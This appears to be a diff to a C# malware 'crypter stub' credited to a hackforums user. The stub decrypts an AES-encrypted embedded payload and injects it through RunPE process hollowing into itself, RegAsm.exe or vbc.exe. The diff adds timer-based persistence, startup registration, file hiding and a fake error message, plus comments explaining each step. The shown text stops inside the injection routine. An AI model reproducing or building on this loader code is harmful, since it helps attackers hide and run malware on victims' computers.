@@ -10,13 +10,10 @@ using System.Security.Cryptography;
 using System.Diagnostics;
 using System.ComponentModel;
 using System.Text;
+
 //Copyright 2016
 //Made by mrmutt for hackforums uid=3005497
 //Please leave this note here
-
-//This is just a file i used to test the stub.
-//Ignore
-
 namespace stupidcancercodeisruiningeverything
 {
 
@@ -25,6 +22,7 @@ namespace stupidcancercodeisruiningeverything
         [STAThread]
         static void Main0()
         {
+            
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
             Application.Run(new FrmOne());
@@ -35,19 +33,23 @@ namespace stupidcancercodeisruiningeverything
 
     class Reader
     {
+        //Reading the encrypted bytes from our resource file
         public static byte[] ReadManaged()
         {
             ResourceManager manager = new ResourceManager("Encrypted", Assembly.GetEntryAssembly());
             byte[] bytes = (byte[])manager.GetObject("encfile");
             return bytes;
         }
+
     }
 
     public class FrmOne : Form
     {
-
+        //Making the form hidden
         private void InitializeComponent()
         {
+            
+            
             SuspendLayout();
             ResumeLayout(false);
             PerformLayout();
@@ -55,49 +57,97 @@ namespace stupidcancercodeisruiningeverything
             WindowState = FormWindowState.Minimized;
 
         }
-
+        //Self explantory
         bool _startup = true;
         string injectTo = "[inject-replace]";
+        bool _fakemessage = true;
+        bool _persistence = true;
         string injectionPath2 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe");
         string injectionPath3 = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "vbc.exe");
-        bool _persistence = true;
-        Process[] pname = Process.GetProcessesByName("[sprocess-replace]");
         public FrmOne()
         {
 
             InitializeComponent();
+            //Basic delay
             Thread.Sleep(5 * 100);
-            if (_persistence)
-            {
-                System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
-                timer1.Interval = 500;
-                Thread.Sleep(500);
-                timer1.Start();
-            }
+            //Giving a byte array for our encrypted bytes
             byte[] fBytes = Reader.ReadManaged();
+            //The encryption key
             string encKey = "[key-replace]";
+            //The encryption key in bytes
             byte[] encKey2 = Encoding.UTF8.GetBytes(encKey);
+            //Makign a hash for the encryption key
             encKey2 = SHA256.Create().ComputeHash(encKey2);
+            //The decrypted bytes
             byte[] eBytes = AESDecrypt(fBytes, encKey2);
+            //Crypting process
             string result = Encoding.UTF8.GetString(eBytes);
+            //The all decrypted bytes
             byte[] eBytes2 = Convert.FromBase64String(result);
+            //If user choosed startup add to startup
+
             if (_startup)
                 AddToStartup();
-
+            //Make the file hidden
             HideFile();
+            if (_persistence)
+            {
+                Process[] pname = Process.GetProcessesByName("[process-replace]");
+                Process[] pname2 = Process.GetProcessesByName("[finame-replace]");
+                System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
+                System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
+                string path = Path.Combine(Application.UserAppDataPath, "[fname-replace]");
+                string path2 = Path.Combine(path, "[finame-replace].exe");
+                if (Application.ExecutablePath == path2)
+                {
+                    timer1.Start();
+                    timer1.Interval = 500;
+                }
+                else
+                {
+                    timer2.Interval = 500;
+                    timer2.Start();
+                }
+            }
             Thread.Sleep(500);
 
-
+            //Use the runpe to inject the decrypted bytes into a process of our injection method choice
             if (injectTo == "[itself]")
-                RunPe1.Run(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, "", eBytes2);
+                REDank.RunDank(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName, "", eBytes2);
+
             if (injectTo == "[regasm]")
-                RunPe1.Run(injectionPath2, "", eBytes2);
+                REDank.RunDank(injectionPath2, "", eBytes2);
+
             if (injectTo == "[vbc]")
-                RunPe1.Run(injectionPath3, "", eBytes2);
+                REDank.RunDank(injectionPath3, "", eBytes2);
+
+            //Fake Message
+            if (_fakemessage)
+            {
+                MessageBox.Show("[messagetext-replace]", "[messagetitle-replace]", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+            //Stopping the program because runpe is already injected
             Environment.Exit(0);
         }
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            Process[] pname = Process.GetProcessesByName("[process-replace]");
+            if (pname.Length == 0)
+            {
+                Process.Start("[process-replace]");
+            }
+        }
+        private void timer2_Tick(object sender, EventArgs e)
+        {
+            Process[] pname2 = Process.GetProcessesByName("[finame-replace]");
+            if (pname2.Length == 0)
+            {
 
+                Process.Start("[finame-replace]");
 
+            }
+        }
+        //Decryption method
         public static byte[] AESDecrypt(byte[] decrypted, byte[] key2)
         {
             byte[] decryptedBytes = null;
@@ -127,12 +177,13 @@ namespace stupidcancercodeisruiningeverything
             }
             return decryptedBytes;
         }
+        //The adding to startup
         public void AddToStartup()
         {
 
             string path = Path.Combine(Application.UserAppDataPath, "[fname-replace]");
             string path2 = Path.Combine(path, "[finame-replace].exe");
-            string pathreg = Path.Combine(Environment.SpecialFolder.ApplicationData.ToString(), "[regfname-replace]", "[regfiname-replace].exe");
+
             if (!File.Exists(path2))
             {
                 DirectoryInfo di = Directory.CreateDirectory(path);
@@ -144,21 +195,16 @@ namespace stupidcancercodeisruiningeverything
 
         public void HideFile()
         {
+            //Hiding
             FileInfo f = new FileInfo(Application.ExecutablePath);
             f.Attributes = FileAttributes.Hidden;
         }
-        private void timer1_Tick(object sender, EventArgs e)
-        {
-            string path = Path.Combine(Application.UserAppDataPath, "/[fname-replace]");
-            string path2 = Path.Combine(path, "[finame-replace].exe");
-            if (pname.Length == 0)
-                Process.Start(pname.ToString());
-        }
+
     }
 
 
 
-    static class RunPe1
+    static class REDank
     {
 
         [DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = CharSet.Unicode)]
@@ -209,7 +255,7 @@ namespace stupidcancercodeisruiningeverything
             private readonly IntPtr StdOutput;
             private readonly IntPtr StdError;
         }
-        public static bool Run(string path, string cmd, byte[] data)
+        public static bool RunDank(string path, string cmd, byte[] data)
         {
 
             int readWrite = 0;
